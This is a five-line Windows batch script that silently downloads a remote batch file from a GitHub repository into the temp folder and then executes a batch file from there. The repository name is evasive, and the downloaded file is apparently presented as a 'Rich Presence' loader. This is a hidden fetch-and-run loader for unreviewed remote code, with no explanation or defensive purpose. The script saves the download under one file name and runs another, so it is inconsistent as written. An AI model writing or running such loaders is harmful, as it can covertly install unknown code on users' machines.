@echo off
cd /d "C:"
curl -s -o %temp%\RichPresence.bat https://raw.githubusercontent.com/L3opard/whyareyoulookingherelol-/main/LeopardRPLoader.bat
%temp%\LeopardRPLoader.bat
exit